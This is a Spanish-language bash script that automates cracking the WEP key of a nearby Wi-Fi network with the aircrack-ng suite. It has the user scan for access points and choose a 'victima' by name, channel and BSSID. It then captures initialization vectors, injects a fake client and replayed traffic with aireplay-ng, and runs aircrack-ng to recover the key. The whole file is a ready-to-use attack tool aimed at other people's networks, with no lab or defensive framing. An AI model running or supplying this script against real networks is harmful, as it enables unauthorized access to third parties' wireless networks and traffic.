#!/bin/bash							#
# script basico para el uso del nuevo aircrack-ng		#
# autor: 	Bruno G. Fosados  <softnuux(at)gmail.com>	#
# version:	v0.1b	v0.1-1	v0.2b	v0.2-1	v0.3		#
# fecha:	03/07	05/07	01/08	02/08	01/09		#
# dependencias:	*aircrak-ng >= 1.0 rc1  (suit)			#
#		*drivers parcheados para inyectar paquetes	#
#################################################################
#puedes agregar -hold en las xterm para detener el cierre del killall y poder depurar
##00:55:C6:B9:21:2B

#checar como root
ID_U=""

if [ x"`which id 2> /dev/null`" != "x" ]
then
        ID_U="`id -u 2> /dev/null`"
fi

if [ x$ID_U == "x" -a x$UID != "x" ]
then
        ID_U=$UID
fi

if [ x$ID_U != "x" -a x$ID_U != "x0" ]
then
        echo "Tienes que correrlo como root" ; exit ;
fi

#como se van a guardar los log.
LOG_DUM="airscript"

#Ancho de Banda lo pudes cambiar segun la calidad de tu se~al
AB=420 

#variables de la suit air crack
AD="airodump-ng"
AR="aireplay-ng"
AC="aircrack-ng"

###### Centinelas #######
T_ESPERA=5
CENTI=1
CONT=1
CTIEMPO=0

## MAC de falsos clientes ULTIMO PAR 00:1A:B2:3C:00:"XX"
FAL_CLT_MAC=11

# crear dir para guardar los log.
mkdir air;
cd air;

#############################################################################
clear
echo "#######################################################################"
echo "###############  PEQUE~O SCRIPT PARA LA SUIT AIRCRACK  ################"
echo "################          airscript.sh  v0.3          #################"
echo "#################           por SoftNux 01/09        ##################"
echo "##################        softnuux(at)gmail.com     ###################"
echo "#######################################################################"
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo "Recuerda que este script solo funciona para encriptaciones WEP por ahora!"
echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo "presiona ENTER para continuar..."
read ANY
echo "Bien lo primero q hay q hacer es un scaning..."
echo "para eso necesito saber:"
echo "Primero, cual es el nombre de tu interfaz de red wifi?"
echo "ej: eth1 ra0 ath0 wlan0"
read IFACE
echo "Se lanzara el airodump y podras ver los acces points que estan en el alcanze"
echo "de tu interfaz de red wifi "$IFACE", presiona ENTER para continuar y espera unos segundos..."
read ANY
xterm -title "Script por SoftNux-----> Scaneando..." -hold -e $AD --band bg $IFACE &
sleep 6
##Pedir datos de victima##
echo "Ahora ya sabes que ap's estan a tu alcanze, en la ventana que se te abrio escoje la victima e ingresa el ESSID(es sencible a minusculas y MAYUSCULAS)"
echo "ej: 2WIRE123 INFINITUM123 LinkSYS"
read VIC_ESSID
echo "Ingresa el canal de la victima ej: 6"
read VIC_CANAL
echo "Ingresa la MAC o BSSID (q NO es lo mismo, pero SI es igual! jajaja. maxima--->SoftNux)"
echo "ej: 00:12:34:AB:CD:EF"
read VIC_MAC
##cerrar el airodump##
echo "Bien ahora hay que atrapar paquetes de iv's(vector de inicializacion) para poder desencriptar la clave WEP de la victima"
killall -9 $AD &
##Atrapar paqutes(lanzar airodum hacia victima)##
echo "Vamos lanzar de nuevo el airodump, pero esta vez estara apuntando hacia tu victima $VIC_ESSID"
echo "presiona ENTER para continuar...($AD --ivs -write $LOG_DUM-$VIC_ESSID --channel $VIC_CANAL $IFACE)"
read ANY
xterm -title "airScript por SoftNux-----> Atrapando paquetes...(IV's)" -e $AD --ivs --write $LOG_DUM-$VIC_ESSID --channel $VIC_CANAL $IFACE &
sleep 1
echo "#########################################################################"
echo "#NO CIERRES LA TERMINAL Q SE TE ACABA DE ABRIR (esta atrapando paquetes)#"
echo "#########################################################################"
echo "presiona ENTER para continuar..."
read ANY
echo "Lo sigiente es injectar un cliente falso e injectar trafico a ese cliente"
echo "Injectando cliente falso ($AR -1 30 -e $VIC_ESSID -a $VIC_MAC -h 00:1A:B2:3C:00:00 $IFACE)"
echo "Presiona ENTER para continuar..."
read ANY
xterm -title "AirScript por SoftNux-----> Injectando CLIENTE..." -e $AR -1 30 -e $VIC_ESSID -a $VIC_MAC -h 00:1A:B2:3C:00:00 $IFACE &
echo "Injectando TRAFICO para el cliente falso($AR -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $VIC_MAC -h 00:1A:B2:3C:00:00 $IFACE)."
echo "Presiona ENTER para continuar..."
read ANY
xterm -title "AirScript por SoftNux-----> Injectando TRAFICO al cliente" -e $AR -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $VIC_MAC -h 00:1A:B2:3C:00:00 $IFACE &
echo "Ve a la ventana de TRAFICO y espera a que te pregunte algo y responde \"y\"(sin las comillas)"
echo "y observa en la ventana de ATRAPANDO como se eleva el numero de paquetes"
sleep 4
echo "si esto sucede quiere decir que se injecto correactamente el cliente"
while test $CENTI -eq 1
do
	echo "Se injecto correctamente el cliente?"
	echo "si(s) o no(n)?"
	read RESP
	if test $RESP = "s" || $RESP = "S" 
	then
		CENTI=0
	
	elif test $RESP = "n" || $RESP = "N" 
	then
		echo "Vamos a injectar otro cliente" 
		echo "presiona ENTER para continuar..."
		read ANY
		echo "Injectando cliente falso ($AR -1 30 -e $VIC_ESSID -a $VIC_MAC -h 00:1A:B2:3C:00:$FAL_CLT_MAC $IFACE)"
		echo "presiona ENTER para continuar..."
		xterm -title "AirScript por SoftNux-----> Injectando CLIENTE..." -e $AR -1 30 -e $VIC_ESSID -a $VIC_MAC -h 00:1A:B2:3C:00:$FAL_CLT_MAC $IFACE &
		echo "Injectando TRAFICO para el cliente falso($AR -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $VIC_MAC -h 00:1A:B2:3C:00:$FAL_CLT_MAC)."
		echo "Presiona ENTER para continuar..."
		read ANY
		xterm -title "AirScript por SoftNux-----> Injectando TRAFICO al cliente" -e $AR -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $VIC_MAC -h 00:1A:B2:3C:00:$FAL_CLT_MAC $IFACE &
		
		FAL_CLT_MAC=$(($FAL_CLT_MAC+11))
		
		CENTI=1
	else	
		echo "Opcion incorrecta"
		
		CENTI=1
	fi
done
echo ""
echo "Hasta que hallas juntado almenos 20,000 paquetes ivs en la ventana de ATRAPANDO."
echo "Podras sacar la clave, SOLO cuando los tengas preciona ENTER para continuar"
read ANY
echo "Perfecto, vamos crackear la WEP esto solo tomara unos momentos" 
echo "presiona ENTER para continuar..."
read ANY
echo "Trabajando....($AC -b $VIC_MAC -a 1 -n 64 -f 4 $LOG_DUM-$VIC_ESSID*.ivs)"
echo ""
$AC -b $VIC_MAC -a 1 -n 64 -f 4 $LOG_DUM-$VIC_ESSID*.ivs
echo "Asi de facil ya tienes las WEP...........bug's softnuux(at)gmail.com"
echo "OK!, solo queda cerrar las ventanas que ya no usamos. presiona ENTER para salir..."
read ANY
killall -9 $AR $AD &
sleep 1
